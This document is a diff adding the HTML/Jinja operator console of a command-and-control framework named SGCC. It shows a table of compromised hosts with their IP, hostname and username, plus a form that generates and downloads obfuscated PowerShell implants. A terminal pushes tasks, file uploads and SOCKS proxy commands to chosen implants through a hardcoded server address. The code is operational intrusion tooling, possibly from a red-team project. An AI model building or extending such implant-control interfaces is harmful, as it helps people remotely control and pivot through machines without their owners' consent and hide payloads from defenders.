@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+
+<html>
+    <head>
+        <!-- turbo needed for web sockets -->
+        {{ turbo() }}
+        <meta charset="UTF-8">
+        <meta name="SGCC" content="width=device-weidth, initial-scale=1.0">
+        <title>SGCC</title>
+        <link href = "{{ url_for('static', filename='css/main.css')}}" rel="stylesheet" />
+        <link href = "{{ url_for('static', filename='images/designer.png')}}", rel="icon"/>
+    </head>
+    <body class="darkmode">
+        
+        <!-- writes the banner up top -->
+        <ul class = "darkmode">
+            <li class="darkmode"><img href="/", style="margin-right:30px;width:64px;height:64px" src="{{ url_for('static', filename='images/designer.png')}}", alt="Home"></li>
+            <li class="darkmode"><button class = "darkmode" onclick="openForm()"> <img src="{{ url_for('static', filename='images/new_implant_dark.png')}}" alt="New Implant" ></button></li>
+            <li class="darkmode"><a sytle = "margin-right: 30px;" href="logs">Logs</a></li>
+            <li class = "darkmode"><a style = "margin-right: 1200px;" href="logout">Sign Out</a></li>
+            <li class = "darkmode">Welcome, {{ session.username }}</li>
+            <button class="darkmode" id="theme-toggle"><img style="width:64px;height:64px;float: right;" src="{{ url_for('static', filename='images/toggle.png')}}" alt="Toggle Theme"></button>
+        </ul>
+
+        <!-- if we choose the new banner option -->
+          <div class="form-popup" id="myForm">
+            <form class="form-container">
+              <h1>New Implant</h1>
+          
+              <label><b>Format</b></label>
+              <input class="darkmode" id = "implant_format" type="text" placeholder="(powershell)" name="format" required>
+          
+              <label><b>Commands</b></label>
+              <input class="darkmode" id = "implant_commands" type="text" placeholder="(enter commands or type all)" name="commands" required>
+
+              <label><b>Output Name</b></label>
+              <input class="darkmode" id = "implant_name" type="text" placeholder="(enter filename)" name="name" required>
+
+              <button id = "implant_download" type="submit" class="darkmode">Download</button>
+              <button type="button" class="darkmode" onclick="closeForm()">Close</button>
+            </form>
+          </div>
+
+
+         <!-- loops through each implant and writes them to the interaction area --> 
+        <div class = "darkmode" style="max-height:250px; width:100%; overflow:auto;">
+        <table class = "darkmode">
+            <tr><th class="darkmode">Implant ID</th><th class="darkmode">Implant Type</th><th class="darkmode" >IP Address</th><th class="darkmode">Hostname</th><th class="darkmode">Username</th><th class="darkmode">Notes</th><th class="darkmode">Interact!</th></tr>  
+
+            {% for implant in implants %}
+
+            <tr>
+                <td class="darkmode" style=white-space:pre;>{{ implant[0] }}</td>
+                <td  class="darkmode" style=white-space:pre;><img style="width:32px;height:32px" src="{{ url_for('static', filename='images/' + implant[1] + '.png') }}", alt={{ implant[1] }}></td>
+                <td class="darkmode" style=white-space:pre;>{{ implant[2] }}</td>
+                <td class="darkmode" style=white-space:pre;>{{ implant[3] }}</td>
+                <td class="darkmode" style=white-space:pre;>{{ implant[4] }}</td>
+                <td class="darkmode" style=white-space:pre;>{{ implant[5] }}</td>
+                <td class="darkmode"><button class="darkmode" id="{{ implant[0] }}" type="button"> <img src="{{ url_for('static', filename='images/designer.png')}}" style="width:96px;height:96px;" alt="Interact!"></button></td>
+            </tr>
+        
+            {% endfor %}
+        </table>
+        </div>
+
+        <!-- where the history html page goes -->
+        {% include "history.html" %}
+        {% block content %}{% endblock %}
+
+        
+        
+        <input id = "terminal" class = "darkmode" type="text" class="form-control" placeholder="Enter a command..." name="messageText" id="messageText" style="position:fixed; bottom: 2.5%; height:5%; width:99%;" autofocus/>
+        
+    </body>
+
+    <script>
+
+        // initializes our focused implant
+        var focused_implant = 0;
+
+        // Adding keyup event listener to the password input
+        document.getElementById("terminal").addEventListener("keyup", function (event) {
+            if (event.keyCode === 13 && focused_implant > 0) {
+                // Check if Enter key is pressed
+
+                // gets the input to the terminal, what command we want
+                var termainal_in = document.getElementById("terminal").value;
+                var request_string = termainal_in;
+        
+                // if our command was to upload
+                if(termainal_in.split(" ")[0] === 'upload')
+                {
+                    // prompts a file upload selection
+                    let input = document.createElement('input');
+                    input.type = 'file';
+                    input.style.display = 'none'
+                    input.onchange = function(e) {
+                        // Handle the selected file(s) here
+                        let file = e.target.files[0];
+                        
+                        // creates a file reader
+                        let reader = new FileReader();
+
+                        // posts our read file to the /upload place
+                        reader.onload = function (event) {
+                        
+                            var res = reader.result;
+
+                            fetch('http://192.168.11.130:5000/{{ upload_uri }}/' + focused_implant, { method: 'POST', body: res });
+                        };
+
+                    
+                    reader.readAsArrayBuffer(file);
+                    
+                    document.body.removeChild(input);
+                    
+                    };
+                    document.body.appendChild(input);
+                    input.click();
+                }
+                else if (termainal_in.split(" ")[0] === "socks-start")
+                {
+
+                    // parse options
+                    const sliced_array = termainal_in.split(" ").slice(1);
+
+                    const joined_arr = sliced_array.join(';');
+
+                    var socks_string = "start " + joined_arr
+                    request_string = "socks " + sliced_array[0];
+
+                    // posts to the /socks area
+                    fetch('http://192.168.11.130:5000/socks/' + focused_implant, { method: 'POST', body: socks_string });
+                }
+                else if (termainal_in.split(" ")[0] == "socks-stop")
+                {
+                    // says to stop the socks proxy
+                    var socks_stop = "stop 0";
+                    fetch('http://192.168.11.130:5000/socks/' + focused_implant, { method: 'POST', body: socks_stop });
+                }
+
+
+                // adds the operator that ran the command after
+                if("{{ session.username }}".length > 0)
+                {
+                    request_string += " {{ session.username }}";
+                }
+                else
+                {
+                    request_string += " signed_out"
+                }
+
+                // sends a post to /tasks
+                fetch('http://192.168.11.130:5000/{{ task_uri }}/' + focused_implant, { method: 'POST', body: request_string });
+
+                document.getElementById("terminal").value = ''
+            }
+        });
+
+        // helper function to download web content
+        function downloadURI(uri, name) {
+            var link = document.createElement("a");
+            link.download = name;
+            link.href = uri;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            delete link;
+        }
+
+        // helper function to pause javascript execution
+        function sleep(milliseconds) {
+            const date = Date.now();
+            let currentDate = null;
+            do {
+                currentDate = Date.now();
+            } while (currentDate - date < milliseconds);
+        }
+
+        // when we click the download implant button
+        document.getElementById("implant_download").addEventListener("click", function() {
+            
+            // gets the implant format
+            var format = document.getElementById("implant_format").value.toLowerCase();
+            document.getElementById("implant_format").value = '';
+
+            if(format === "powershell")
+            {
+                format = "ps";
+            }
+
+            // gets the implant commands
+            var commands = document.getElementById("implant_commands").value.toLowerCase();
+            document.getElementById("implant_commands").value = '';
+
+            // posts to /implant
+            fetch('http://192.168.11.130:5000/implant/' + format, { method: 'POST', body: commands });
+
+            // we need to pause so we have time to obfuscate on the server side
+            sleep(1000);
+
+            // after obfuscation is complete, gets the file name and downloads from /implant
+            var name = document.getElementById("implant_name").value;
+            document.getElementById("implant_name").value = ''; 
+
+            // downloads the appropriate implant
+            downloadURI('http://192.168.11.130:5000/implant/' + format, name)
+
+            closeForm();
+        });
+
+        // gets the last implant we wanted to focus
+        focused_implant = localStorage.getItem('focused_implant');
+
+
+        // defines the function to focus the implant generator
+        function openForm() 
+        {
+            document.getElementById("myForm").style.display = "block";
+            //document.getElementById("history").style.display = "none";
+        }
+
+        // defines the function to close the implant generator
+        function closeForm() 
+        {
+            document.getElementById("myForm").style.display = "none";
+            //document.getElementById("history").style.display ="block";
+        }
+
+        // defaults to close
+        closeForm()
+
+        // if the focused_implant isn't the default, focus it
+        try
+        {
+            if(focused_implant > 0)
+            { 
+                document.getElementById(focused_implant).click();
+            }
+        }
+        catch(error)
+        {
+            focused_implant = 0;
+        }
+
+
+        // gets darkmode classes last so that way we can apply the theme to all applicable items
+        var savedTheme = localStorage.getItem('theme');
+
+        var button = document.getElementById('theme-toggle');
+        var boxes = document.querySelectorAll('.darkmode');
+
+        // toggles to lightmode if applicable
+        if (savedTheme === 'lightmode') 
+        {    
+            boxes.forEach(box => {
+                box.classList.toggle('darkmode');
+            });
+        }
+
+        // when we click the toggle, toggles the theme
+        button.addEventListener('click', () => {
+            
+
+            if(savedTheme === "darkmode")
+            {
+                savedTheme = "lightmode";
+            }
+            else
+            {
+                savedTheme = "darkmode";
+            }
+
+            boxes.forEach(box => {
+
+                box.classList.toggle('darkmode');
+                localStorage.setItem('theme', savedTheme);
+                
+            });
+        });
+    </script>
+</html>
